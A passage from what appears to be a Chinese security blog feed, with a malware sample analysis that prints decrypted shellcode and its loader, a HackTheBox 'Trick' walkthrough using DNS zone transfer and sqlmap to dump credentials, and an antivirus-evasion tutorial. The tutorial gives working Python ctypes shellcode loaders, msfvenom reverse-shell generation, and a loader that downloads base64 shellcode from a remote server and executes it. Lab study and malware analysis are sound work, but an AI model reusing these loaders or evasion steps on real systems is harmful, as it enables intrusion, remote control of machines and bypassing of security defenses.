tkyoBO3KO63pb3C4t4HRurBj1FhhI+ZRBhv/uj0g37u7UiYi1A/qc/y7Zi20zCXngvAUvmFYnc85FzD3qlsvZ7XvpuIYiwKFenLkak7Uc9i314RuxaUQOtR2r95HevLSGm+IXSBJfd/VP0Aio5m/A+0V5jHCRPmw+FekHJgXd9TUvivcuEV4EsjUELcNIp31Zkg1jJMzop9iWbWbClaU/CH2vj5bc2wOFL0SoxylFqAjkwr2mpBz9q5rLpPa+adb9qTlhpNyazShhTKoYK5QJllnfpMbYDRZwdriRZxuCCPW/TcO9nJDmqjYer71v+ChCZd069W8wlTM/6ipgVt+AjE3mKfYLr/GLaKASrpYSrVayWEDV8Jm98+sfoMY8NemHQBpgiS+F4vU2jFcXqzl+NsBmOSm+KWnFjYQ+2f77nNSOhYlthpQDji3rWmaexBsYAOLZjoHMpMJbQf5Ez5n74Qi+I+rkPUJ0kb7SEYbAKkNb+Gx0fi8fl9R7lnouxj32n2nSyNtDPTsg5QNjdvJR3euG5I5boCpp41u4vj89jc9ovPhwYDMtHR0Su01+DYvu4/PQ0wubZTGcOoHlNc/FJFikg3quDTV2qgJ5I3WXh9ln1XEfFG+M3ox39datKXszX4/JgB0wMJWv1mL4JHuiSmGVVfyOg0c2bzvLg8RRBDzAo1JmAsVhX1ByOi3Pfo6nUua1idQilMDWG27J1ILWunboWMEtL7DYHzk01VPs2sONiOdXjDrQwGaIOfvremionO1z5zbVwQJkUpIzuQVPQSo2J7VRy6ADZcLxkEZ2s8tOt+XQqqrVhBd5/vCnyaX8X5benvG2Iu8n63Cd0XWYJ5BAQHU82jApkcTm+zt9Cm0otJOcbnK/PYAGqbqSVPfZCrVTTZJQ7qm1osMv1OzZGJezBQLKl7xY9EERdcYZ1pxKza0VgFmzP+TvDwMWVlWi8lsaw42uF8CLc+bjWXN&#x27;)%4))).rstrip(b&#x27;\\0&#x27;)\nshellcode=bytearray(b)\nctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64\nptr=ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))\nbuf=(ctypes.c_char*len(shellcode)).from_buffer(shellcode)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))\nhandle=ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\x94\x85\x94R\x94.&quot;</span><br></code></pre></td></tr></table></figure><p>还有一层</p><h3 id="base64-aes"><a href="#base64-aes" class="headerlink" title="base64+aes"></a>base64+aes</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658910422123-bc9fee13-e654-4ddc-abc3-56092106a9c3.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;H\x8b\xc4H\x89X\x08H\x89h\x10H\x89p\x18H\x89x AVH\x83\xec eH\x8b\x04%`\x00\x00\x003\xdbH\x8bH\x18H\x8bQ \xebN\x0f\xb7BHL\x8bBP\x8b\xcb\xd1\xe8\x85\xc0~+D\x8b\xc8A\x0f\xb7\x00M\x8d@\x02f\x83\xf8ar\nA\xba\xe0\xff\x00\x00fA\x03\xc2i\xc9\x83\x00\x00\x00\x0f\xb7\xc0\x03\xc8I\xff\xc9u\xd8\x0f\xba\xf1\x1f\x81\xf9\xe6\x9c\xca\x1c\x0f\x84\x97\x00\x00\x00H\x8b\x12H\x85\xd2u\xadH\x8b\xfbE3\xc0\xbaT\xb8\xb9\x1aH\x8b\xcf\xe8\x88\x00\x00\x00\xbab4\x89^H\x8b\xcfL\x8b\xc0\xe8x\x00\x00\x00H\x8d\x15E\x01\x00\x003\xc9\x8b*H\x8dz\x08L\x8dr\x04\x8bt*\x04D\x8dI@A\xb8\x00\x10\x00\x00\x8b\xd6H\x03\xfd\xff\xd0L\x8b\xc8\x85\xf6t L\x8b\xc0H+\xf83\xd2\x8b\xc3\xff\xc3\xf7\xf5B\x8a\x042B2\x04\x07A\x88\x00I\xff\xc0;\xder\xe6H\x8b\\$0H\x8bl$8H\x8bt$@H\x8b|$HH\x83\xc4 A^I\xff\xe1H\x8bz \xe9k\xff\xff\xff\xcc\xcc\xccH\x8b\xc4H\x89X\x08H\x89h\x10H\x89p\x18H\x89x AVH\x83\xec HcA&lt;L\x8b\xc9I\x8b\xd8\x8b\x8c\x08\x88\x00\x00\x00\x8b\xea\x85\xc9tjB\x83\xbc\x08\x8c\x00\x00\x00\x00t_I\x8d\x04\tD\x8bX\x18E\x85\xdbtRD\x8b@ \x8bx\x1c\x8bp$M\x03\xc1I\x03\xf9I\x03\xf13\xd2E\x85\xdbt8E\x8b\x10M\x03\xd13\xc9A\x8a\x02M\x8b\xf2\xeb\x11i\xc9\x83\x00\x00\x00\x0f\xbe\xc0\x03\xc8I\xff\xc6A\x8a\x06\x84\xc0u\xeb\x0f\xba\xf1\x1f;\xcdt(\xff\xc2I\x83\xc0\x04A;\xd3r\xc83\xc0H\x8b\\$0H\x8bl$8H\x8bt$@H\x8b|$HH\x83\xc4 A^\xc3H\x85\xdbu\x0c\x0f\xb7\x0cV\x8b\x04\x8fI\x03\xc1\xeb\xd4I\x8b\xd2I\x8b\xc9\xff\xd3\xeb\xca\xcc\xcc\x13\x00\x00\x00|Q\xa3\x8dI\xd8\x96~ij\xc1\xb1|\x1fX*y/\xf9&#125;\x04\x00\x00\x94U\xa3\x8dI\xa0\xd9)\x123\x892\x907\xb0/y/\xf94\xd2g\xa5\x8a1\xf6\x7fij\x84\x80\xbc.\x98\xc1UI\xf6c\xd5\xa3\x8dI\xd8\x968f\xdd\xcd\xf09\x92\t\xca8\xac\x00\x1c7\xe6\x82\x0f\t\xd2\x17\xa1\xe9\xc1\xb1|^W\x9d\xbbk\xf8\xb4\x18\\M\x08\xe1F\x02\xb1O&gt;N\x83`\x9bL\xe9\x1e9\x97H\xc5\xeb/\xf6\x99a\xedj\xc1\xb1|\x1f1\xea\xfa/\xf9|\x19\\LH\x1a\x1f\xaef\xd4\xd04\xaej\xb4\x0f\x86\xd0\x06\x03\x92\xc5\x82V\x9c\x96~(=\x80\xe7=J\x19~/x\xac/\x19 aq\x95\x1f\xb9(\xe3\x14\xf9\xf5\xd1\x10I7\x13r\xf8_+\x8dI\xd8\xd3O\x9f&quot;Dqs\x9b\xf4*y/\xbcM\xa7 1GT\x96~ij\xce5\xe7\x1fX*\xf2S\xffd\x14\x92&#123;\x01]iq\xed\xe1\xc1\xb1|\x94\x14,e\xa4\x95zq\xeb\x8c\xb8\x90\x1f2MZJ\xf5z;\x10\xa3=\x0b\xd14PV\xc8x.\xa7\xb7\x0f\x0c\xa7\xd7\x1a1W5\xfd/\xf9|Q\xa3\xc4\xc0\x14\xdfG\x95\x19\x95\xf3\xf7C\xfd*1.\n4\xd8zeq\&#x27;i\x81 \xe7\x8d\x95&#125;[a\xc2\x0c\xf1\xb5\xf5\xa9\xeb\x08\x89\xac\x8f6\xe0\x9b\x898\xa6W\xdb\xeeAt\xa4#\x0f\xe2\xd1\x08\x85\xd7 (5\x89N\x9cW\xd3n]\x07\xb1&#125;\xa1\xe1\x82\xfe\xdc\xf66\xe2&amp;\xe5\x818\x94l\xab0.\x0f0\xd8S\xc5\xca\x1c\xae%45\x9f\xf0 ^\x05k\&#x27;n\xa6\xbf\x10\xf4\xcc\x1f\x99\xc3?=&lt;\x96\xe4/W\xd9\xc6\xc1\&#x27;\xf9|\x18*C,\x90\x1dzL\n\xc1\xb1|W\xd3Zagz\xbaq\xe6\xbc\xad\xbe\x99a-j\xc1\xf9\xf7)\x10\xaf\x8f[\xe3s\xe6\xf5\xc5\x982\xde\xf5\&#x27;:)\xe8\x82\xe0\xa7\x17\x9f\xb33`$A\xc1\xc2\xbe\xb6\xc4=\xd2x\xab9.\x98f\xf0\xce\x11\xd2\xaf\\r\x01QU\xc4\x11u\xe1\xce0\x96\xb9c\xf0\xf7\x11\xe7\xaf\\r\x00QQ\xc3hj\xc1\xb14\x92m\xd6x/\xf9\x97M\xc5\xa3F\xc7\x12~ij\xc1\xb1\xf7\x0boc\xf0\xf7\x11\t\xaf\\r\x01Q\x92I\xea\xaf\xc3&lt;9\xe0\x10\xa1E\xe9\xb1\xf9\xae\xd7\xac\xc00\xde\xf5m\xacx^\xc2\xf2\x86b@\xe7\xb5\xf5\xb0\xd7B\x01\xd9f6\xe0\xab\x80N\xabW\xd1\xeb\x92\xee\xb1\xbbT\x05\x8cI\xd8\x96~ij\x80:bZi\xdcH\xe6C|Q\xb3\x8d\x08`\x96nij\x80\x08&lt;\x1fX*\x86:\xae&#125;Q\xa3\xc5\xc0\x1dik?k\xc1\xb14\x96\x9ef\xf4\x83\xdd,U\xa3\x8d\x01U\xeaZ9&quot;H\xddXW\x11\xa3\x96\xc4\xed\xc5a\xd6\x8dI\&#x27;\x837hj\xc1\xfd\xf7c|b&lt;\x1e\x0f\xec\x96\xe7\xa9\x19&amp;\\\x80\xa3.H\xc5XK\x9en]w\xf8=\xaee\xbc\xa43\x9fqv\xea\xc1\xb1|\x1f\xa7\xef\xfa\xd2\xfc\x03\x94\xc5\x82V\\\x96~ij\xc1\xfd\xf5s|\x02\xbek\xddD\xd9\xb0\x8dI\x1f\xd2ZY\x08\xc5\xb1|W\x9fn]\x0f\xf9|Q\xa3\xcc\xf0\xd8\x92~i&quot;H@\xf5\xc5\x11\xa3\x81\xd0\xec\xb2Q\xa3\x8d\xca \x97\x0b\xd0\xe9&#125;\x95(\x1bX*yZF4\xda7\xa9)\xdc\x96~)\xe0\xeb\xf9\x83\xddW\x9d\xfd\x0b\xa5xQ\xa34\xa6f&#123;\xa0-\xe7e\xb9l^J\x0b5\xa6\x001\xd8Cr\\@\x96~i\&#x27;\xc0V&lt;\x9f\xa5+v\xaa\xaa\x83\xae\\\xc5\xc0)ik\xfbj\xc1\xb1\xbb[|i\xa7\xd05\xf3\x97\xe7\xa9\x0eB\xde\xf55N\x89\xf8U\xc0i\xe31\x924\xb0\x9doA\x85\x14Z\x95Oe\xde1|\x1fX*1\xa614\xa6F\xc5\x882\x946\xe4nS\xf9\xf5\xd5\x10\x03\xbb O8E\xe0\xbdM\xd3\xde\x81\xa8&amp;\xf8H\x00\xc3\xa7\xf9\xe9gx\xb8\xe9\xab\x8dI\x83\xcb!7+\x9d\xf0!^\x06k&amp;\xec\xf6c\x15\xa3\x8d+\xec\x1f ij\xc1\xb1Y\x95\xe1^y/\xf9|&#123;\xbd\xd6d\xd8\x96~iE\xfeCn\x1fX*y|y\xf9n\xa3\x8dI\xd8\xa5`\x8f\x03\xc1\xb1|\x1f\x88\xd5\x86\xd0\x06\x83\xae\\b\xf75H~ij\xc1i\x83\xe0\xa7\xd5\x86\xd0\x06\x14Q\xa3\x8dI\xd8\x96~\x89\x95&gt;N\x83\xe0\xa7\xd5\x11/\xf9|Q\xa3\x8dI0i\x81\x96\x95&gt;N\x83jX*y/\xf9|QSr\xb6\&#x27;i\x81\x96\x95.\x0f\x91\xc1X*y/\x01\x83\xae\\r\xb6\&#x27;i\x16ij\xc1\xb1|\x1fX*y/\xf9|Q\xa3\x8d\x00\x88\xde29+\x91\xf8R[\x14fyB\x8a\n2\xd1\xf9g\xbc\xfa\x12i\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br></code></pre></td></tr></table></figure><p>成功解密到shell code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode=<span class="hljs-built_in">bytearray</span>(b)<br><br><span class="hljs-comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br>ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64<br><br><span class="hljs-comment">#申请内存</span><br>ptr=ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>),ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)),ctypes.c_int(<span class="hljs-number">0x3000</span>),ctypes.c_int(<span class="hljs-number">0x40</span>))<br><br><span class="hljs-comment">#放入shellcode</span><br>buf=(ctypes.c_char*<span class="hljs-built_in">len</span>(shellcode)).from_buffer(shellcode)<br>ctypes.windll.kernel32.RtlMoveMemory(<br>ctypes.c_uint64(ptr),<br>buf,<br>ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode))<br>)<br><br><span class="hljs-comment">#创建一个线程从shellcode首地址开始执行</span><br>handle=ctypes.windll.kernel32.CreateThread(<br>ctypes.c_int(<span class="hljs-number">0</span>),<br>ctypes.c_int(<span class="hljs-number">0</span>),<br>ctypes.c_uint64(ptr),<br>ctypes.c_int(<span class="hljs-number">0</span>),<br>ctypes.c_int(<span class="hljs-number">0</span>),<br>ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)))<br><br><span class="hljs-comment"># 等待上面创建的线程运行完</span><br>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h2 id="加载shellcode"><a href="#加载shellcode" class="headerlink" title="加载shellcode"></a>加载shellcode</h2><p>生成一个loader加载shell code<br>运行后向 120.79.87.123这个地址发送icmp数据包<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659595360479-36291c19-1ccb-4256-b161-ebe2e38ed5cd.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659595524044-377a7586-0b31-4894-ae02-fe37c71cff92.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝队之路</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Trick</title>
    <link href="/2022/07/09/HTB%20Trick/"/>
    <url>/2022/07/09/HTB%20Trick/</url>
    
    <content type="html"><![CDATA[<p>对端口进行扫描<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659682826486-9a0112ce-2e76-4dee-ad5d-fc11a20d10fb.png#" alt="image.png"></p><p>直接IP访问不通，添加hosts<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659682871786-33e9f513-edea-4370-87cf-2f77d778d073.png" alt="image.png"></p><p>一个静态网页<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659682898567-d3462637-47ea-4add-8c8f-a6d63214aa02.png#averageHue=%231a2928&clientId=uae275a87-766e-4&from=paste&height=821&id=ubdeb62b1&originHeight=1232&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1650224&status=done&style=none&taskId=u29c26bba-822f-42f1-85cc-998dc66b200&title=&width=1706.6666666666667" alt="image.png"><br>目录扫描未获得信息，寻找子域名。<br>通过DNS域传送，寻找子域名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">dig axfr trick.htb @trick.htb<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659684225991-8b870677-301d-48a7-a08d-c1bcd477cce3.png#averageHue=%23262930&clientId=u29015f6b-131a-4&from=paste&height=211&id=udbed5b01&originHeight=316&originWidth=1441&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86922&status=done&style=none&taskId=ua3496e7c-7b7c-479d-90d9-770e9c71662&title=&width=960.6666666666666" alt="image.png"><br>得到子域名，添加hosts<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659684289620-fe2fb9ae-ef6e-4ffe-a9ea-44c37d2dd736.png#averageHue=%232b2d35&clientId=u29015f6b-131a-4&from=paste&height=176&id=u3c130027&originHeight=264&originWidth=671&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69789&status=done&style=none&taskId=u5b0bfff6-5b75-4401-b272-02d3af79a77&title=&width=447.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659684962876-27642b44-228b-4b3b-80e1-804b47583bd6.png#averageHue=%23ded5c9&clientId=u29015f6b-131a-4&from=paste&height=613&id=ub1200af6&originHeight=920&originWidth=2556&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1136575&status=done&style=none&taskId=u0c7a0c92-c4a2-4a91-b436-be901288218&title=&width=1704" alt="image.png"><br>一个登录页面，目录扫描未发现敏感目录或者文件，密码没爆出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r 2.txt --level=3 --batch<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659687170078-3c8d2cf4-3c37-4d30-a02a-7767b7127bf0.png#averageHue=%2342444c&clientId=u29015f6b-131a-4&from=paste&height=416&id=ud1b3620e&originHeight=624&originWidth=2555&originalType=binary&ratio=1&rotation=0&showTitle=false&size=247408&status=done&style=none&taskId=u2f048bdf-5fd1-4e37-9212-a49eeb12fc0&title=&width=1703.3333333333333" alt="image.png"></p><p>当前数据库不是管理员权限<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659687331625-1ba3797b-27c5-4a5e-974d-33108b26915f.png#averageHue=%2344464e&clientId=u29015f6b-131a-4&from=paste&height=213&id=u9d4be937&originHeight=320&originWidth=1583&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102897&status=done&style=none&taskId=u40c2a0a1-b22c-40e7-a69e-5c5243a9fed&title=&width=1055.3333333333333" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r 2.txt --dbs --batch<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659687383834-46fdc92f-82f0-4bc6-b6ae-93e68e73a60d.png#averageHue=%23454850&clientId=u29015f6b-131a-4&from=paste&height=93&id=u503cec4d&originHeight=139&originWidth=759&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29031&status=done&style=none&taskId=u768edb87-ecdf-4561-bd07-8e765140bdc&title=&width=506" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r 2.txt --tables -D payroll_db --batch<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659687473174-6fc4ced8-06f8-4093-955d-abecaf46ac50.png#averageHue=%2345474e&clientId=u29015f6b-131a-4&from=paste&height=245&id=u1a37cd04&originHeight=367&originWidth=454&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39039&status=done&style=none&taskId=uc6835cc5-5363-4590-be95-ef798cfaf76&title=&width=302.6666666666667" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r 2.txt --dump -T <span class="hljs-built_in">users</span> -D payroll_db --batch<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659687611997-720bcb3f-d540-49f6-8dfe-6c3a6e368f02.png#averageHue=%2344464e&clientId=u29015f6b-131a-4&from=paste&height=101&id=u047d52c9&originHeight=151&originWidth=1241&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20320&status=done&style=none&taskId=uac94745e-cd2f-4555-b07e-2ab72c53f51&title=&width=827.3333333333334" alt="image.png"></p><p>得到账户密码<br><code>Administrator  SuperGucciRainbowCake  Enemigosss</code></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659687808234-c6572510-5c55-41a9-82ad-8347096a5b50.png#averageHue=%23ececec&clientId=u29015f6b-131a-4&from=paste&height=552&id=u055173a8&originHeight=828&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117714&status=done&style=none&taskId=u5ebb9161-21d8-485b-8595-6119ec2b638&title=&width=1706.6666666666667" alt="image.png"><br>成功登录后台</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 免杀</title>
    <link href="/2022/07/09/Py%20shellcode%20%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <url>/2022/07/09/Py%20shellcode%20%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>免杀初探：Python Shellcode加载器绕过AV</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用Shellcode和Python制作的加载器进行分离。<br>主要将ShellCode进行编码，分离及反序列化达到bypass的思路和方法。</p><h2 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p><p>CS生成ShellCode<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658990096241-4797fc49-9ffc-456c-bf78-f42884565b14.png" alt="image.png"></p><p>msf生成ShellCode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.15</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> LPORT=<span class="hljs-number">6666</span> -f python<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658990660719-296294e5-2777-40dc-ad5f-51404e9f4f43.png" alt="image.png"></p><p>以Python为例：<br><code> msfvenom -p windows/x64/exec CMD=calc.exe -f python</code>生成弹计算器shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><br>shellcode = <span class="hljs-string">b&#x27;\xfcH\x83\xe4\xf0\xe8\xc0\x00\x00\x00AQAPRQVH1\xd2eH\x8bR`H\x8bR\x18H\x8bR H\x8brPH\x0f\xb7JJM1\xc9H1\xc0\xac&lt;a|\x02, A\xc1\xc9\rA\x01\xc1\xe2\xedRAQH\x8bR \x8bB&lt;H\x01\xd0\x8b\x80\x88\x00\x00\x00H\x85\xc0tgH\x01\xd0P\x8bH\x18D\x8b@ I\x01\xd0\xe3VH\xff\xc9A\x8b4\x88H\x01\xd6M1\xc9H1\xc0\xacA\xc1\xc9\rA\x01\xc18\xe0u\xf1L\x03L$\x08E9\xd1u\xd8XD\x8b@$I\x01\xd0fA\x8b\x0cHD\x8b@\x1cI\x01\xd0A\x8b\x04\x88H\x01\xd0AXAX^YZAXAYAZH\x83\xec AR\xff\xe0XAYZH\x8b\x12\xe9W\xff\xff\xff]H\xba\x01\x00\x00\x00\x00\x00\x00\x00H\x8d\x8d\x01\x01\x00\x00A\xba1\x8bo\x87\xff\xd5\xbb\xf0\xb5\xa2VA\xba\xa6\x95\xbd\x9d\xff\xd5H\x83\xc4(&lt;\x06|\n\x80\xfb\xe0u\x05\xbbG\x13roj\x00YA\x89\xda\xff\xd5calc.exe\x00&#x27;</span><br><br>shellcode = <span class="hljs-built_in">bytearray</span>(shellcode)<br><br><span class="hljs-comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br>ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64<br><br><span class="hljs-comment"># 申请内存</span><br>ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)), ctypes.c_int(<span class="hljs-number">0x3000</span>), ctypes.c_int(<span class="hljs-number">0x40</span>))<br><br><span class="hljs-comment"># 放入shellcode</span><br>buf = (ctypes.c_char * <span class="hljs-built_in">len</span>(shellcode)).from_buffer(shellcode)<br>ctypes.windll.kernel32.RtlMoveMemory(<br>    ctypes.c_uint64(ptr), <br>    buf, <br>    ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode))<br>)<br><br><span class="hljs-comment"># 创建一个线程从shellcode防止位置首地址开始执行</span><br>handle = ctypes.windll.kernel32.CreateThread(<br>    ctypes.c_int(<span class="hljs-number">0</span>), <br>    ctypes.c_int(<span class="hljs-number">0</span>), <br>    ctypes.c_uint64(ptr), <br>    ctypes.c_int(<span class="hljs-number">0</span>), <br>    ctypes.c_int(<span class="hljs-number">0</span>), <br>    ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>))<br>)<br><br><span class="hljs-comment"># 等待上面创建的线程运行完</span><br>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658996124310-c57ca817-2b18-4e0c-af77-64326ceab503.png" alt="image.png"></p><h2 id="分离"><a href="#分离" class="headerlink" title="分离"></a>分离</h2><p>通过本地请求Http Server获取ShellCode内容并进行加载执行<br><code>python3 -m http.server</code></p><p>通过request请求来获取ShellCode进行加载执行从而实现分离。</p><table><thead><tr><th>shellcode &#x3D; urllib.request.urlopen(‘<a href="http://192.168.1.1:8000/test.txt').read()">http://192.168.1.1:8000/test.txt&#39;).read()</a></th></tr></thead></table><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>编码<br>进行base64编码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659016941974-ddef3a75-a644-42e7-acb6-e8e903e28d57.png" alt="image.png"></p><h3 id="下载ShellCode并执行"><a href="#下载ShellCode并执行" class="headerlink" title="下载ShellCode并执行"></a>下载ShellCode并执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> ctypes<br><br>shellcode = urllib.request.urlopen(<span class="hljs-string">&#x27;http://192.168.150.134:8000/text1.txt&#x27;</span>).read()<br>shellcode = base64.b64decode(shellcode)<br>shellcode =codecs.escape_decode(shellcode)[<span class="hljs-number">0</span>]<br><br>shellcode = <span class="hljs-built_in">bytearray</span>(shellcode)<br><br>ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64<br><br>ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)), ctypes.c_int(<span class="hljs-number">0x3000</span>), ctypes.c_int(<span class="hljs-number">0x40</span>))<br><br><br>buf = (ctypes.c_char * <span class="hljs-built_in">len</span>(shellcode)).from_buffer(shellcode)<br>ctypes.windll.kernel32.RtlMoveMemory(<br>    ctypes.c_uint64(ptr), <br>    buf, <br>    ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode))<br>)<br><span class="hljs-comment"># 创建一个线程从shellcode防止位置首地址开始执行</span><br>handle = ctypes.windll.kernel32.CreateThread(<br>    ctypes.c_int(<span class="hljs-number">0</span>), <br>    ctypes.c_int(<span class="hljs-number">0</span>), <br>    ctypes.c_uint64(ptr), <br>    ctypes.c_int(<span class="hljs-number">0</span>), <br>    ctypes.c_int(<span class="hljs-number">0</span>), <br>    ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>))<br>)<br><span class="hljs-comment"># 等待上面创建的线程运行完</span><br>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span 